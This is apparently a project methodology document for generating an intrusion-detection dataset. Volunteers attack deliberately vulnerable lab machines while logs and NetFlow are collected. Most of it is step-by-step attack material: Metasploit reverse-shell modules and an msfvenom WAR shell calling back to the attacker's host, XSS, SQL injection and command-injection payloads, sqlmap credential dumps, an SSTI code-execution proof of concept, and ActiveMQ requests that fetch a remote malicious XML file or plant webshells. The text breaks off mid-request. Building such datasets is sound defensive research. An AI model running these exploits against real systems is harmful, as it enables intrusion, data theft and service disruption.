# General Info
This project is focused on creation of a Cybersecurity Attacks Dataset which can later be used for IDS/IPS systems, ML or any other relevant purpose.

The idea is to have an isolated environment with intentionally vulnerable VM's and volunteer attackers who will conduct the attacks. 

In the following sections there is information on the different aspects of this project, and all of that is for the purpose of constructing a Methodology for the entire process.

---
# Scenario

The scenario is having a controlled environment with vulnerable machines and attacker machines. 
#### Vulnerable Machines

Should have 7 of each.

- Metasploitable 2 VMs
	- Linux VMs
- Metasploitable 3 VMs
	- Windows VMs
- SecGen Custom VMs - Still testing if possible
- VulHub Docker Containers inside VMs
	- Recent vulnerabilities
	- Will deploy different combinations of containers inside VMs

The `Attacks` section is organized by type of vulnerable machine, providing detailed information on every vulnerability of each machine type.
#### Attacker Machines

Each attacker will be given a preconfigured Kali Linux VM inside the environment with all the tools and software needed. That adds up to 7 Kali Linux VMs.

---
# Monitoring

The `Monitoring` section provides information on the monitoring of the environment, including raw packer capture, NTP synchronization, logging, and NetFlow data collection.

##### RAW Packet Capture
- Still to be tested by Bidik's proposal - Waiting on it
##### NTP
- NTP Syncing will be done by configuring `ntp.finki.ukim.mk` as NTP server on all machines 
- For Linux based, in **systemd** 
	- `/etc/systemd/timesyncd.conf`
- *For older Linux distros, manual installation of NTP server*
- For Windows based, in **Windows Time Service (W32Time)**
##### Logs
- [VictoriaLogs](https://github.com/VictoriaMetrics/VictoriaLogs)
	- All the system logs are stored here
	- Pulling logs from the Kafka queue

- Log Agent on the machine
	- Collect logs from the machine and send them to Kafka
	- Possible agents:
		- [Grafana Promtail](https://grafana.com/grafana/dashboards/20881-promtail-monitoring-metrics-and-logs/)
		- [fluentbit](https://fluentbit.io/)

- [Kafka](https://kafka.apache.org/)
	- receiving and queuing logs from the log agent of each machine

- Deployment scheme:
		![Logs](img/Logs.drawio.png)
##### NetFlow

- [nprobe](https://www.ntop.org/products/netflow-probes/nprobe/) - NetFlow probe (on the firewall)

- [ntopng](https://www.ntop.org/products/traffic-analysis/ntopng/) - NetFlow web interface

- [kafka](https://kafka.apache.org/)
	- optional: receiving and queuing NetFlow packets from the NetFlow probe (nProbe on the firewall)

- Deployment scheme:
	![NetFlow](img/NetFlow.drawio.png)

---
# Attacks

The `Attacks` section explains each of the attacks that will be conducted by the attacker.
It is organized in subsections for each vulnerable machine type.
For each attack, we have: 
- `attack_name` - unique identifier of an attack
- `exploit_cve` - if present
- `target_port` and `protocol`
- detailed step-by-step instructions on how to conduct the attack
	- provided specific commands
	- provided variations of attacks that can be combined randomly
- provided instructions on what to run on attack start and attack end

After each conducted attack, we can have one of the 3 scenarios:
- **success** - exploited successfully
- **ran** - ran without errors but did not exploit (also used for scanning)
- **error** - tool errored / attack did not run properly

Here follows the attacks list.

---

### 0. Initial Full Port Scan

**Name:** `nmap-full-portscan`  
**Target port:** 1-65535 / TCP

**Port Scan:**

```bash
attacklog start --name nmap-full-portscan --dst-ip <dst-ip> --dst-port 1-65535
```

```bash
nmap -p- <dst-ip>
```

```bash
attacklog end --status ran
```

---
## Metasploitable 2

note: More attacks will be added before the infrastructure is ready.

### 1. Unix R-Services Reverse Shell

**Name:** `ms2-rservices-revshell`  
**Target port:** 513 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-rservices-portscan --dst-ip <dst-ip> --dst-port 513
```

```bash
nmap -p 513 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-rservices-revshell --dst-ip <dst-ip> --dst-port 513
```

```bash
rlogin -l root <dst-ip>
```

```bash
attacklog end --status <success|ran|error>
```

---

### 2. UnrealIRCD Backdoor Reverse Shell

**Name:** `ms2-unrealircd-revshell`  
**Target port:** 6667 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-unrealircd-portscan --dst-ip <dst-ip> --dst-port 6667
```

```bash
nmap -p 6667 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-unrealircd-revshell --dst-ip <dst-ip> --dst-port 6667
```

```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST <dst-ip>
set RPORT 6667
set LHOST <your_ip>
set LPORT 4444
set payload cmd/unix/reverse
exploit
```

```bash
attacklog end --status <success|ran|error>
```

---

### 3. DVWA XSS Reflected

**Name:** `ms2-dvwa-xss-reflected`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-dvwa-xss-reflected-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-dvwa-xss-reflected --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA XSS (Reflected) page and inject into the input field:

**Low / Medium:**

```
<svg onload=alert('Example')>
```

**High:** same payload, same bypass.

```bash
attacklog end --status <success|ran|error>
```

---

### 4. DVWA XSS Stored

**Name:** `ms2-dvwa-xss-stored`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-dvwa-xss-stored-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-dvwa-xss-stored --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA XSS (Stored) page.

**Low** - inject into message field:

```
<script>alert('example')</script>
```

**Medium** - expand the `Name` field's maxlength in browser DevTools, then inject into name:

```
<img src=x onerror=alert('example')>
```

**High:** not bypassable.

```bash
attacklog end --status <success|ran|error>
```

---

### 5. DVWA Command Injection

**Name:** `ms2-dvwa-cmdinject`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-dvwa-cmdinject-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-dvwa-cmdinject --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA Command Execution page.

**Low:**

```
127.0.0.1 && whoami
```

**Medium:**

```
127.0.0.1 | whoami
```

```bash
attacklog end --status <success|ran|error>
```

---

### 6. DVWA File Inclusion (LFI)

**Name:** `ms2-dvwa-lfi`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-dvwa-lfi-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-dvwa-lfi --dst-ip <dst-ip> --dst-port 80
```

**Low:**

```
http://<dst-ip>/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

```bash
attacklog end --status <success|ran|error>
```

---

### 7. DVWA SQL Injection (Manual)

**Name:** `ms2-dvwa-sqli-manual`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-dvwa-sqli-manual-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-dvwa-sqli-manual --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA SQL Injection page.

**Low:**

```
1' or 1 = '1
```

Dump column names:

```
'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
```

Dump credentials:

```
' UNION SELECT user, password FROM users#
```

**Medium:**

```
1 UNION SELECT user, password FROM users#
```

```bash
attacklog end --status <success|ran|error>
```

---

### 8. Mutillidae SQLMap

**Name:** `ms2-mutillidae-sqlmap`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms2-mutillidae-sqlmap-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms2-mutillidae-sqlmap --dst-ip <dst-ip> --dst-port 80
```

Run one or more of the following. Pick based on what traffic pattern is needed:

**Basic scan:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username,password --batch
```

**Boolean-based blind:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=B --batch --level=3
```

**Time-based blind:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=T --batch --level=3
```

**Error-based:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=E --batch --level=3
```

**UNION-based:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=U --batch --level=3 --union-cols=3-6
```

**Full dump (aggressive):**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --batch --dbs --tables --dump --level=5 --risk=3
```

```bash
attacklog end --status <success|ran|error>
```

---

## Metasploitable 3

note: More attacks will be added before the infrastructure is ready.
### 9. GlassFish Reverse Shell

**Name:** `ms3-glassfish-revshell`  
**Target port:** 4848 / TCP

**Port Scan:**

```bash
attacklog start --name ms3-glassfish-portscan --dst-ip <dst-ip> --dst-port 4848
```

```bash
nmap -p 4848 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-glassfish-revshell --dst-ip <dst-ip> --dst-port 4848
```

Generate the payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f war -o shell.war
```

Start a listener:

```
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

Upload via the GlassFish admin panel at `http://<dst-ip>:4848` (credentials: `admin / sploit`):

1. Left panel -> **Applications** -> **Deploy**
2. Browse and select `shell.war` -> **OK**

Trigger the shell:

```bash
curl http://<dst-ip>:8080/shell/
```

```bash
attacklog end --status <success|ran|error>
```

---

### 10. Jenkins Reverse Shell

**Name:** `ms3-jenkins-revshell`  
**Target port:** 8484 / TCP

**Port Scan:**

```bash
attacklog start --name ms3-jenkins-portscan --dst-ip <dst-ip> --dst-port 8484
```

```bash
nmap -p 8484 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-jenkins-revshell --dst-ip <dst-ip> --dst-port 8484
```

```
use exploit/multi/http/jenkins_script_console
set RHOSTS <dst-ip>
set RPORT 8484
set LHOST <your_ip>
set LPORT 4447
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGETURI /script
exploit
```

```bash
attacklog end --status <success|ran|error>
```

---

### 11. IIS HTTP Denial of Service (CVE-2015-1635)

**Name:** `ms3-iis-http-dos`  
**Target port:** 80 / TCP

**Port Scan:**

```bash
attacklog start --name ms3-iis-http-dos-portscan --dst-ip <dst-ip> --dst-port 80
```

```bash
nmap -p 80 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-iis-http-dos --dst-ip <dst-ip> --dst-port 80
```

```
use auxiliary/dos/http/ms15_034_ulonglongadd
set RHOSTS <dst-ip>
set RPORT 80
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 12. IIS FTP Wordlist Login Attack

**Name:** `ms3-iis-ftp-wordlist`  
**Target port:** 21 / TCP

**Port Scan:**

```bash
attacklog start --name ms3-iis-ftp-wordlist-portscan --dst-ip <dst-ip> --dst-port 21
```

```bash
nmap -p 21 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-iis-ftp-wordlist --dst-ip <dst-ip> --dst-port 21
```

```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <dst-ip>
set RPORT 21
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 13. ElasticSearch Reverse Shell (CVE-2014-3120)

**Name:** `ms3-elasticsearch-revshell`  
**Target port:** 9200 / TCP

**Port Scan:**

```bash
attacklog start --name ms3-elasticsearch-portscan --dst-ip <dst-ip> --dst-port 9200
```

```bash
nmap -p 9200 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-elasticsearch-revshell --dst-ip <dst-ip> --dst-port 9200
```

```
use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS <dst-ip>
set RPORT 9200
set LHOST <your_ip>
set LPORT 4444
set PAYLOAD java/meterpreter/reverse_tcp
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 14. SNMP Enumeration

**Name:** `ms3-snmp-enum`  
**Target port:** 161 / UDP

**Port Scan:**

```bash
attacklog start --name ms3-snmp-portscan --dst-ip <dst-ip> --dst-port 161 --protocol udp
```

```bash
nmap -sU -p 161 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-snmp-enum --dst-ip <dst-ip> --dst-port 161 --protocol udp
```

```
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <dst-ip>
set RPORT 161
set COMMUNITY public
set VERSION 1
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 15. JMX Reverse Shell (CVE-2015-2342)

**Name:** `ms3-jmx-revshell`  
**Target port:** 1617 / TCP

**Port Scan:**

```bash
attacklog start --name ms3-jmx-portscan --dst-ip <dst-ip> --dst-port 1617
```

```bash
nmap -p 1617 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name ms3-jmx-revshell --dst-ip <dst-ip> --dst-port 1617
```

```
use exploit/multi/misc/java_jmx_server
set RHOSTS <dst-ip>
set RPORT 1617
set LHOST <your_ip>
set LPORT 4444
set payload java/meterpreter/reverse_tcp
run
```

```bash
attacklog end --status <success|ran|error>
```

---
## SecGen

Still under testing phase.

---
## VulnHub

Note: all of this attacks are from https://github.com/vulhub/vulhub
More attacks will be added before the infrastructure is ready.

### 16. Flask (Jinja2) Server-Side Template Injection

**Name:** `vulnhub-flask-ssti`  
**Target port:** 8000 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-flask-ssti-portscan --dst-ip <dst-ip> --dst-port 8000
```

```bash
nmap -p 8000 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-flask-ssti --dst-ip <dst-ip> --dst-port 8000
```

Flask is a popular Python web framework that uses Jinja2 as its template engine. A Server-Side Template Injection (SSTI) vulnerability can occur when user input is directly rendered in Jinja2 templates without proper sanitization, potentially leading to remote code execution.

#### Environment Setup

```
docker compose up -d
```

After the server starts, visit `http://<dst-ip>:8000/` to view the default page.

#### Vulnerability Reproduction

First, verify the SSTI vulnerability exists by visiting:

```
http://<dst-ip>:8000/?name={{233*233}}
```

If you see the result `54289`, it confirms the presence of the SSTI vulnerability.

To achieve remote code execution, use the following POC that obtains the `eval` function and executes arbitrary Python code:

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

Visit the following URL (with the POC URL-encoded) to execute the command:

```
http://<dst-ip>:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

The command execution result will be displayed:

![](img/flask-ssti-1.png)

```bash
attacklog end --status <success|ran|error>
```

---

### 17. Apache Airflow Command Injection in Example DAG (CVE-2020-11978)

**Name:** `vulnhub-airflow-cve-2020-11978`  
**Target port:** 8080 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-airflow-cve-2020-11978-portscan --dst-ip <dst-ip> --dst-port 8080
```

```bash
nmap -p 8080 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-airflow-cve-2020-11978 --dst-ip <dst-ip> --dst-port 8080
```

In Apache Airflow prior to 1.10.10, there is a command injection vulnerability in the example DAG `example_trigger_target_dag`, allowing attackers to execute arbitrary commands in the worker process.

#### Environment Setup

```bash
#Initialize the database
docker compose run airflow-init

#Start service
docker compose up -d
```

#### Exploit

Visit `http://<dst-ip>:8080` to see the Airflow management terminal, and enable the `example_trigger_target_dag` flag:

![](img/airflow-cve-2020-11978-1.png)

Click the "trigger" button on the right, then input the configuration JSON with the crafted payload `{"message":"'\";touch /tmp/airflow_dag_success;#"}`:

![](img/airflow-cve-2020-11978-2.png)

Wait a few seconds to see the execution success:

![](img/airflow-cve-2020-11978-3.png)

Check the CeleryWorker container to confirm `touch /tmp/airflow_dag_success` was executed:

```
docker compose exec airflow-worker ls -l /tmp
```

![](img/airflow-cve-2020-11978-4.png)

```bash
attacklog end --status <success|ran|error>
```

---

### 18. Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981)

**Name:** `vulnhub-airflow-cve-2020-11981`  
**Target port:** 6379 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-airflow-cve-2020-11981-portscan --dst-ip <dst-ip> --dst-port 6379
```

```bash
nmap -p 6379 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-airflow-cve-2020-11981 --dst-ip <dst-ip> --dst-port 6379
```

In Apache Airflow prior to 1.10.10, if the Redis broker has been controlled by an attacker, the attacker can execute arbitrary commands in the worker process.

#### Environment Setup

```bash
#Initialize the database
docker compose run airflow-init

#Start service
docker compose up -d
```

#### Exploit

The Redis port 6379 is exposed on the network. Through Redis, add the evil task `airflow.executors.celery_executor.execute_command` to the queue to execute arbitrary commands.

Use the exploit script to run `touch /tmp/airflow_celery_success`:

```
pip install redis
python exploit_airflow_celery.py <dst-ip>
```

Check the logs:

```bash
docker compose logs airflow-worker
```

![](img/airflow-cve-2020-11981-1.png)

Verify the command was executed:

```
docker compose exec airflow-worker ls -l /tmp
```

![](img/airflow-cve-2020-11981-2.png)

```bash
attacklog end --status <success|ran|error>
```

---

### 19. 1Panel Control Panel PostAuth SQL Injection (CVE-2024-39907)

**Name:** `vulnhub-1panel-cve-2024-39907`  
**Target port:** 10086 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-1panel-cve-2024-39907-portscan --dst-ip <dst-ip> --dst-port 10086
```

```bash
nmap -p 10086 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-1panel-cve-2024-39907 --dst-ip <dst-ip> --dst-port 10086
```

CVE-2024-39907 is a collection of SQL injection vulnerabilities in the 1Panel control panel. Insufficient filtering allows attackers to achieve arbitrary file writes and ultimately remote code execution. Affects 1Panel v1.10.9-lts and earlier, patched in v1.10.12-lts.

#### Environment Setup

```
docker compose up -d
```

After the server starts, access `http://<dst-ip>:10086/entrance` with credentials `1panel` / `1panel_password`.

#### Vulnerability Reproduction

After logging in, send the following malicious POST request. The `orderBy` parameter in `/api/v1/hosts/command/search` lacks proper input validation, allowing SQL injection:

```
POST /api/v1/hosts/command/search HTTP/1.1
Host: <dst-ip>:10086
Accept-Language: zh
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Cookie: psession=your-session-cookie
Connection: close
Content-Type: application/json
Content-Length: 83

{
  "page":1,
  "pageSize":10,
  "groupID":0,
  "orderBy":"3;ATTACH DATABASE '/tmp/randstr.txt' AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;",
  "order":"ascending",
  "name":"a"
}
```

![](img/1panel-cve-2024-39907-1.png)

```bash
attacklog end --status <success|ran|error>
```

---

### 20. Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678)

**Name:** `vulnhub-activemq-cve-2022-41678`  
**Target port:** 8161 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-activemq-cve-2022-41678-portscan --dst-ip <dst-ip> --dst-port 8161
```

```bash
nmap -p 8161 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-activemq-cve-2022-41678 --dst-ip <dst-ip> --dst-port 8161
```

Apache ActiveMQ prior to 5.16.5 and 5.17.3 contains an authenticated RCE vulnerability in the Jolokia `/api/jolokia` endpoint.

#### Environment Setup

```
docker compose up -d
```

After the server starts, open `http://<dst-ip>:8161/` and log in with `admin` / `admin`.

#### Exploit

List all available MBeans via `/api/jolokia/list`:

```
GET /api/jolokia/list HTTP/1.1
Host: <dst-ip>:8161
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Origin: http://localhost
```

![](img/activemq-cve-2022-41678-1.png)

There are 2 exploitable MBeans that can perform RCE.

**Method #1** — using `org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean` to write a webshell (requires ActiveMQ 5.17.0+):

```
python poc.py -u admin -p admin http://<dst-ip>:8161
```

![](img/activemq-cve-2022-41678-2.png)

Webshell is written to `/admin/shell.jsp` successfully:

![](img/activemq-cve-2022-41678-3.png)

**Method #2** — using `jdk.management.jfr.FlightRecorderMXBean` to write a webshell (requires OpenJDK 11+):

```
python poc.py -u admin -p admin --exploit jfr http://<dst-ip>:8161
```

![](img/activemq-cve-2022-41678-4.png)

Webshell is written to `/admin/shelljfr.jsp` successfully:

![](img/activemq-cve-2022-41678-5.png)

```bash
attacklog end --status <success|ran|error>
```

#### Notes from Jovan

###### Request:
```
GET /api/jolokia/list HTTP/1.1
Host: localhost:8161
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic YWRtaW46YWRtaW4=
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Origin: http://localhost
```
command for method 1: `python3 poc.py -u admin -p admin http://localhost:8161`
command for method 2:  ```
```
python3 poc.py -u admin -p admin --exploit jfr http://localhost:8161
```

---

### 21. Apache ActiveMQ Jolokia Remote Code Execution (CVE-2026-34197)

**Name:** `vulnhub-activemq-cve-2026-34197`  
**Target port:** 8161 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-activemq-cve-2026-34197-portscan --dst-ip <dst-ip> --dst-port 8161
```

```bash
nmap -p 8161 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-activemq-cve-2026-34197 --dst-ip <dst-ip> --dst-port 8161
```

CVE-2026-34197 is an authenticated RCE vulnerability in Apache ActiveMQ before 5.19.4 and 6.0.0 before 6.2.3. The Jolokia JMX-HTTP bridge exposes `addNetworkConnector(String)` on the Broker MBean. An authenticated attacker can invoke this operation with a crafted `vm://` transport URI containing a `brokerConfig` parameter pointing to a remote Spring XML configuration file, triggering arbitrary code execution during bean instantiation.

#### Environment Setup

```
docker compose up -d
```

After the server starts, visit `http://<dst-ip>:8161` and log in with `admin` / `admin`.

#### Vulnerability Reproduction

Without credentials the Jolokia API returns 401 Unauthorized:

![](img/activemq-cve-2026-34197-1.png)

Start an HTTP server on the attacker machine to serve a malicious Spring XML configuration file (e.g., executes `id > /tmp/success`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value><![CDATA[id > /tmp/success]]></value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

Start the HTTP server in the same directory as `poc.xml`:

```
python3 -m http.server 80
```

Send the following request to invoke `addNetworkConnector` on the Broker MBean (replace `<your_ip>` with the attacker's HTTP server address):

```
POST /api/jolokia/ HTTP/1.1
Host: <dst-ip>:8161
Content-Type: application/json
Authorization: Basic YWRtaW46YWRtaW4=

{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://<your_ip>/poc.xml)"]}
```

![](img/activemq-cve-2026-34197-2.png)

Verify the command was executed inside the container:

```
docker compose exec activemq ls -al /tmp/
docker compose exec activemq cat /tmp/success
```

![](img/activemq-cve-2026-34197-3.png)

```bash
attacklog end --status <success|ran|error>
```

#### Notes from Jovan

###### request:
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Content-Type: application/json
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 220

{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://host.docker.internal/poc.xml)"]}
```

---

### 22. Apache Airflow Authentication Bypass (CVE-2020-17526)

**Name:** `vulnhub-airflow-cve-2020-17526`  
**Target port:** 8080 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-airflow-cve-2020-17526-portscan --dst-ip <dst-ip> --dst-port 8080
```

```bash
nmap -p 8080 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-airflow-cve-2020-17526 --dst-ip <dst-ip> --dst-port 8080
```

In Apache Airflow prior to 1.10.13, a default session secret key is used, which allows an attacker to forge session cookies and impersonate arbitrary users when authentication is enabled.

#### Environment Setup

```bash
#Initialize the database
docker compose run airflow-init

#Start service
docker compose up -d
```

After the server starts, browse `http://<dst-ip>:8080` to see the login page.

#### Exploit

Get a session string from the login page cookie:

```
curl -v http://<dst-ip>:8080/admin/airflow/login
```

![](img/airflow-cve-2020-17526-1.png)

Use [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) to crack the session key:

```
flask-unsign -u -c [session from Cookie]
```

![](img/airflow-cve-2020-17526-2.png)

Use the cracked key (`temporary_key`) to generate a new session with `user_id` = `1`:

```
flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
```

![](img/airflow-cve-2020-17526-3.png)

Use the generated session to log in as admin:

![](img/airflow-cve-2020-17526-4.png)

```bash
attacklog end --status <success|ran|error>
```

#### Notes from Jovan

###### in venv:
`pip3 install flask-unsign[wordlist]`

After generated session cookie, insert it in: inspect -> application -> Cookies -> session, then reload and you should be logged in as an admin

---

### 23. AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077)

**Name:** `vulnhub-aj-report-cnvd-2024-15077`  
**Target port:** 9095 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-aj-report-cnvd-2024-15077-portscan --dst-ip <dst-ip> --dst-port 9095
```

```bash
nmap -p 9095 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-aj-report-cnvd-2024-15077 --dst-ip <dst-ip> --dst-port 9095
```

AJ-Report v1.4.0 and earlier contains an authentication bypass issue allowing an attacker to perform arbitrary code execution.

#### Environment Setup

```
docker compose up -d
```

After the server starts, access the login page at `http://<dst-ip>:9095`.

#### Exploit

Send the following request to execute arbitrary code:

```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: <dst-ip>:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

